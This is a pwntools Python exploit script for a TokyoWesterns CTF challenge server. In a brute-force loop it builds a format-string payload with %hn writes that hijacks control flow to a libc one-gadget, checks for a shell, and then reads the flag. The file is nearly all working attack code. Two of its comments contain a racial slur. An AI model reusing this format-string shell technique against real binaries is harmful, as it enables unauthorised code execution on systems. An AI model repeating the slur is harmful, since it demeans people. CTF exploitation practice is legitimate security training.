from pwn import *
import random

while True:

    #r = process("./patched")
    r = remote("pwn01.chal.ctf.westerns.tokyo", 12463)

    r.recvuntil("> ")

    #first_pad = main_ret & 0xffff
    #first_pad = int(raw_input(), 16) & 0xffff
    first_pad = (random.randint(0, 0xfff) << 4) | 0x8
    print("brute", hex(first_pad))
    # first pad is stack last 2 bytes pad
    # second pad is libc off between libc_start_main and one gadget
    #first_pad = 0x6908
    second_pad = 0xe6ce6 - 0x270b3 - first_pad

    # first_pad - 0x28
    # first_pad + 0x98
    # point rbp to first_pad + 0x90
    # first stack pointer nigger
    payload = "%c"*16 + "%{}c".format(str(first_pad - 0x28 - 0x10)) + "%hn"
    # second stack nigger
    payload += "%c"*14 + "%{}c".format(first_pad + 0x98 - (first_pad - 0x28) - 14) + "%hn"

    second_pad = 0x10000 + (first_pad + 0x90) - (first_pad + 0x98)

    payload += "%{}c".format(str(second_pad))
    payload += "%46$hn"

    third_pad = (0xe6ce6 - 0x270b3) - (0x10000 + (first_pad + 0x90))

    payload += "%{}c".format(str(third_pad))
    payload += "%*16$p%48$n"

    """
    payload = "%c"*16 + "%{}c".format(str(first_pad - 0x10 - 0x28).zfill(5)) + "%hn"
    second_pad = (((first_pad - 0x28) + 0xd0) & 0xffff) + 0x80000 - (first_pad - 0x28)
    print("SICE", hex(second_pad))
    payload += "%{}c".format(str(second_pad))
    payload += "%46$hn"
    """

    r.sendline(payload)
    r.sendline("echo 'penis'")
    a = ""
    try:
        a = r.recvuntil("penis", timeout=1)
    except:
        pass
    if "penis" in a:
        print("SICE")
        r.sendline("cat flag*")
        r.interactive()
    r.close()
